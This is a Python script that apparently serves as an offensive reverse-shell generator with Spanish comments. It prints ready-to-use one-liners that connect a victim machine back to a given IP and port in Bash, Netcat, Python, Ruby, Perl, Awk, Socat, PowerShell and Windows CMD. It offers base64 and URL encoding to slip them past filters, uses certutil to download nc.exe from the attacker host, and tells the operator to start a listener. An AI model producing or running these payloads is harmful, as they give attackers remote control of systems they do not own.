import urllib.parse
import base64

class Colors:
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'

def generate_payloads(ip, port):
    return {
        "Bash (TCP)": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Netcat (Tradicional)": f"nc -e /bin/sh {ip} {port}",
        "Netcat (mkfifo)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "Python 3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "Awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell> \" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'",
        "Socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
        "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "Windows CMD": f"certutil -urlcache -split -f http://{ip}/nc.exe nc.exe & nc.exe {ip} {port} -e cmd.exe"
    }

def run(ip, port, use_base64=False, use_urlencode=False):
    payloads = generate_payloads(ip, port)
    for name, cmd in payloads.items():
        print(f"\n{Colors.OKCYAN}[*] {name}:{Colors.ENDC}")
        final_cmd = cmd
        
        if use_base64:
            b64_encoded = base64.b64encode(cmd.encode()).decode()
            if "PowerShell" in name:
                ps_b64 = base64.b64encode(cmd.encode('utf-16le')).decode()
                final_cmd = f"powershell -e {ps_b64}"
            elif "Windows" in name:
                pass # Base64 CMD es complejo sin powershell, lo dejamos crudo
            else:
                final_cmd = f"echo {b64_encoded} | base64 -d | bash"
                
        if use_urlencode:
            final_cmd = urllib.parse.quote(final_cmd)
            
        print(f"{Colors.OKGREEN}{final_cmd}{Colors.ENDC}")
    print(f"\n{Colors.WARNING}[!] Ponte a la escucha: nc -lvnp {port}{Colors.ENDC}")
